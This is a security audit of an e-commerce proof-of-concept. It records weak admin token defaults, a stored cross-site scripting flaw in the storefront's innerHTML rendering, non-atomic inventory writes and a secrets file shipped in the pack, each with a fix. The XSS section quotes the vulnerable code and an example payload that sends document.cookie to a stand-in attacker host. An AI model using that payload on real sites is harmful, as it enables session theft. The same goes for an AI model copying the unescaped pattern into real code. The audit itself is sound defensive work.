# Side B Launch-Blocker Audit — PoC security and integrity

- Artifact ID: SB-AR-B19-001
- Version: 1.0.0
- Owner: Side B Platform Lead
- Source inputs/dependencies: `platform/poc/**` as of this cycle; Side B Execution Book §22 (security/privacy minimum baseline), B5, B12, B18, B19; controller M1 task F
- Acceptance criteria: each known launch-blocker class is identified with an exact location, a concrete exploit or failure path, current status (fixed / partially mitigated / open), an executable test where one exists, and a named remediation with its owner and gate.
- Validation procedure/result: source review plus executed tests and runtime probes; results referenced per finding.
- Evidence path: `evidence/side-b/g1/SB-EV-G1-007_launch_blocker_audit.md`
- Readiness status: SELF-VALIDATED (audit) — individual findings carry their own status
- Downstream consumer: controller; Side A risk owner; gates G3/G4/G5
- Remaining risks/next action: **three of four classes remain open launch blockers.** None of them may be closed by this agent alone; each needs a named human risk owner.

## Summary

Descriptive IDs are used below for readability. The canonical register IDs are in
`docs/side-b/SIDE_B_RISK_REGISTER.csv` v2.0.0, which carries both in an `audit_alias`
column. Both names refer to the same risk.

| Audit ID | Register ID | Class | Location | Status | Blocks gate |
|---|---|---|---|---|---|
| SB-RISK-B5-001 | SB-RISK-002 | Unsafe admin defaults | `backend/app/main.py`, `.env.example` | **PARTIALLY MITIGATED** this cycle; still not authentication | G3 |
| SB-RISK-B9-001 | SB-RISK-003 | Stored XSS in storefront | `storefront/app.js` | **OPEN** — not fixed, deliberately | G3 |
| SB-RISK-B12-001 | SB-RISK-005 | Non-transactional inventory/catalog | `backend/app/catalog.py`, `main.py` | **OPEN** — architectural, PoC-inherent | G3 |
| SB-RISK-B18-001 | SB-RISK-011 | Secrets handling | `platform/poc/.env` present in the pack | **OPEN** | G4 |
| SB-RISK-B2-001 | SB-RISK-010 | Runtime/dependency divergence | Python 3.14 local vs 3.12 image, no lock | **PARTIALLY MITIGATED** (CI matrix added) | G3 |
| SB-RISK-B2-002 | SB-RISK-012 | Third-party deprecation warning | `starlette.testclient` | OPEN, low severity | — |
| SB-RISK-B2-003 | SB-RISK-013 | Stale cross-checkout bytecode | `__pycache__` copied between trees | **FIXED** this cycle | — |
| — | SB-RISK-004 | Float money path | catalog, quote, stylist, config, clients | **PARTIALLY MITIGATED** — float path removed; tax/customs/carrier still absent | G3 |
| — | SB-RISK-014 | Evidence attribution | `evidence/side-b/bootstrap/**` | MITIGATED by supersession | — |
| — | SB-RISK-015 | Rounding policy for VAT/refunds/multi-currency | not implemented | OPEN | G3 |

---

## SB-RISK-B5-001 — Unsafe admin defaults

**What was found.** `POST /api/v1/admin/products` was guarded only by `x_admin_token != settings.admin_api_token`, where `settings.admin_api_token` defaults to the literal `"change-me"` when `ADMIN_API_TOKEN` is unset. Any caller who read the public `.env.example` could therefore perform a privileged write against a default-configured instance.

**Proven, not theorised.** During this cycle an intermediate test run reached that path and **destructively rewrote the preserved sample catalog fixture** `backend/data/products.json` (sha256 `536f91ab…` → `39e5651c…`). The file was restored byte-identically; the full incident is recorded in `evidence/side-b/EVIDENCE_ATTRIBUTION_AND_SUPERSESSION.md` §5. That accident is the proof of exploitability.

Secondary defects in the same gate: the comparison was a non-constant-time `!=`, and an empty `X-Admin-Token` header compared equal to an empty configured token.

**Mitigations applied this cycle** (`backend/app/main.py`, `backend/app/config.py`):

1. `Settings.admin_token_is_default` detects the shipped placeholder (`""` or `"change-me"`).
2. `require_admin` returns **HTTP 503** while a placeholder token is configured — in *every* environment, not only outside development. A placeholder credential now authorizes nothing.
3. Token comparison uses `hmac.compare_digest`, and an empty header is rejected before comparison.
4. `backend/tests/conftest.py` adds a session-scoped autouse fixture that snapshots the protected data fixtures, restores them, and **fails the run** if a test mutated them.

**Executable tests** — `backend/tests/test_admin_security.py`, 8 tests, all passing:
`test_admin_write_without_token_is_rejected`, `test_admin_write_with_wrong_token_is_rejected`,
`test_admin_write_with_shipped_placeholder_token_is_rejected`, `test_rejected_admin_write_does_not_persist`,
`test_placeholder_token_disables_admin_api_in_every_environment[development|staging|production]`,
`test_admin_token_default_detection`, `test_config_module_imports_cleanly`.

Runtime proof (SB-EV-G1-005 §4.6): a container started with `APP_ENV=production ADMIN_API_TOKEN=change-me` returned **HTTP 503** to an admin write.

**Still open — this is NOT authentication.** There is no identity, no user model, no MFA, no session or token expiry, no rotation, no rate limiting, no lockout, no authorization model beyond one shared bearer string, and **no audit trail of privileged writes**. The Execution Book §22 baseline (MFA on admin, separate individual accounts, server-side authorization on every privileged action, audit logs for price/stock/refund/role changes) is not met.

**Remediation:** work package B5 — managed identity provider or vetted auth library, RBAC matrix, MFA on privileged roles, per-actor audit events. Owner: Side B with Side A role definitions. Gate: G3.

---

## SB-RISK-B9-001 — Stored cross-site scripting in the storefront

**Status: OPEN. Deliberately not fixed in this cycle** (task F scope: audit and record).

**Location.** `platform/poc/storefront/app.js`, `renderProducts()`:

```js
container.innerHTML = items.map(product => `
  <article class="card">
    <img src="${product.image_url}" alt="Placeholder product visual for ${product.name}" />
    ...
    <h3>${product.name}</h3>
    <p>${product.description}</p>
```

and in the stylist handler:

```js
result.innerHTML = `<strong>${recommendation.rationale}</strong><p>...</p>`;
```

**Exploit path.** Every interpolated field (`image_url`, `name`, `description`, `collection`, `fibre_composition`, `made_in`) is written into `innerHTML` without escaping. The catalog is writable through `POST /api/v1/admin/products`, whose schema imposes only length and pattern limits — `name`, `description` and `collection` accept arbitrary text, and `image_url` accepts `HttpUrl | str`, i.e. any string. A payload such as `"name": "<img src=x onerror=fetch('https://attacker.invalid/'+document.cookie)>"` is stored in `products.json` and executes in every visitor's browser on load. `rationale` is server-generated but is built from stored product names, so it is a second sink for the same stored payload.

This chains directly with SB-RISK-B5-001: a weak admin gate plus an unescaped sink is stored XSS with a low-effort entry point.

**Aggravating factors.** No Content-Security-Policy header, no `X-Content-Type-Options`, no `Referrer-Policy`; nginx serves defaults. `HttpUrl | str` also permits `javascript:` in `src`.

**Why not fixed now.** The instruction was to audit and record. The fix touches rendering and demo behaviour, and belongs with the B6/B9 front-end work rather than being bundled into an evidence-integrity cycle.

**Remediation (specified, not applied).**
1. Replace `innerHTML` interpolation with DOM construction and `textContent`; set `img.src` via a property after validating the scheme against an allowlist (`https:` only).
2. Tighten `Product.image_url` to `HttpUrl` and reject non-`https` schemes server-side.
3. Add a strict CSP (`default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'`) plus `X-Content-Type-Options: nosniff` in the nginx config.
4. Add an automated test that stores a script payload through the admin path and asserts it is rendered inert (browser-level test, work package B20).

Owner: Side B web lead. Gate: **G3 — must be closed before any public exposure.**

---

## SB-RISK-B12-001 — Non-transactional inventory and catalog persistence

**Status: OPEN. Architectural; inherent to the JSON-file PoC.**

**Location.** `platform/poc/backend/app/catalog.py`.

**Failure paths.**
1. `upsert()` serialises the entire catalog and calls `self.path.write_text(...)`. This is not atomic: a crash, a full disk, or a container stop mid-write leaves a truncated or empty catalog with no backup and no recovery path. The correct pattern is write-temp-then-`os.replace`.
2. The `threading.Lock` is **process-local**. Uvicorn with more than one worker, more than one replica, or the Docker bind mount shared with a host process gives concurrent writers with no mutual exclusion. Two writers interleave read-modify-write and one update is lost.
3. Read-modify-write has no optimistic concurrency check — no version, no ETag, no compare-and-set. A stale client silently overwrites newer data.
4. There is **no inventory ledger**. `variant.stock` is a mutable scalar. `POST /api/v1/orders/quote` reads stock and returns a total, but nothing reserves it; two concurrent quotes both see stock and both "succeed". There is no append-only movement record, no reason code, no reference, no audit of adjustments.
5. Stock is not decremented anywhere, because no order is persisted — the PoC has no order entity at all.

**Consequence.** Overselling is not merely possible, it is unavoidable under concurrency, and no stock difference is traceable. Execution Book B12's gate ("concurrency tests prevent overselling and every stock difference has a traceable reason") cannot be met by this design at all.

**Remediation.** Work package B12 as specified: PostgreSQL with real transactions, an append-only inventory ledger (`sku, location, quantity_delta, reason, reference, timestamp, actor`), atomic reserve/release tied to an order state machine, `SELECT … FOR UPDATE` or equivalent on the reservation path, an outbox for events, and concurrency tests that attempt to oversell. Interim hardening if the JSON store persists at all: atomic temp-file replace, a file lock, and a version field with compare-and-set.

Owner: Side B backend lead with Side A warehouse/authority rules. Gate: G3.

---

## SB-RISK-B18-001 — Secrets handling

**Status: OPEN.**

**Findings.**
1. `platform/poc/.env` **exists inside the distributed pack** and contains `ADMIN_API_TOKEN=local-baseline-only-not-for-sharing`. `.gitignore` lists `.env`, but this pack is not a Git working tree, so the ignore rule provides no protection — the file travels with the archive. Any recipient of the pack holds that credential.
2. The same file is byte-reachable from at least three checkouts on this machine (`Desktop\Claude\…`, `Desktop\Platform\…`), so the value has already been duplicated.
3. `docker-compose.yml` loads `.env` via `env_file`, so the token is baked into container environment and visible to `docker inspect`.
4. `OPENAI_API_KEY` / `OPENAI_MODEL` are declared in configuration although no code reads them (`settings.openai_api_key` is unused). This is an unnecessary secret-shaped surface.
5. There is no secret manager, no rotation procedure, no separation between local, staging and production values, and no detection for a leaked value.

**Not a production breach:** the current value is a local placeholder for a PoC with no real data. It is nevertheless a process failure that must not be repeated with a real credential.

**Remediation.** Remove `.env` from any distributed artifact and ship only `.env.example`; generate local tokens at setup time; move every non-local secret to a managed secret store (Execution Book §22 and B18); define rotation and offboarding; drop the unused OpenAI variables until an AI use case is approved under B17; add secret scanning to CI.

Owner: Side B cloud/security owner with the named account owner from Side A. Gate: G4.

---

## SB-RISK-B2-001 — Runtime and dependency divergence

**Status: PARTIALLY MITIGATED.**

The ExecPlan targets an isolated **Python 3.12**; `backend/Dockerfile` uses `python:3.12-slim`; all local execution used the user-site **Python 3.14.4** with no `.venv`. `requirements.txt` pins six direct dependencies but there is no lockfile for transitive dependencies, and the earlier install mutated the user's global Python environment. `make` is unavailable on this workstation, so the `Makefile` is not a usable entry point here.

Mitigation applied: `.github/workflows/ci.yml` now runs a 3.12/3.13/3.14 matrix and additionally runs `compileall`, both validators, the fail-closed activation assertion, the mutation harness, and a fixture-checksum check.

Still open: no `.venv` bootstrap, no lockfile (`pip-compile`/`uv`/hashes), no SBOM, no dependency scanning. Owner: Side B. Gate: G3.

---

## SB-RISK-B2-002 — Third-party deprecation warning

`starlette.testclient` emits `StarletteDeprecationWarning: Using httpx with starlette.testclient is deprecated; install httpx2 instead`. It is not suppressed and appears in every preserved transcript. Low severity; resolve during the dependency-lock work.

---

## SB-RISK-B2-003 — Stale cross-checkout bytecode

**Status: FIXED this cycle.**

`__pycache__` directories copied from `C:\Users\User\Desktop\Platform\Fashion_Commerce_Codex_Multi_Agent_Pack` were being executed in this tree, because the copy preserved source mtime and size and Python therefore accepted the cached `.pyc` as current. Four modules — `app/__init__`, `app/candidate_activation`, `tests/test_api`, `tests/test_candidate_activation` — carried `co_filename` values pointing at the other tree. This silently invalidated the attribution of every prior local test result.

Fixed by purging all `__pycache__`/`.pytest_cache`, running with `PYTHONDONTWRITEBYTECODE=1` and `pytest -p no:cacheprovider`, and setting the same in CI. Full detail in `evidence/side-b/EVIDENCE_ATTRIBUTION_AND_SUPERSESSION.md` §4.

---

## Not audited this cycle

Rate limiting, security headers, CORS hardening beyond the local origin list, TLS, logging/PII redaction, dependency vulnerabilities, accessibility, consent/cookies, GDPR data-subject workflows, backup/restore, and mobile security. Absence from this document is not a clean result — it means untested. These belong to B19/B20/B22 and remain open.
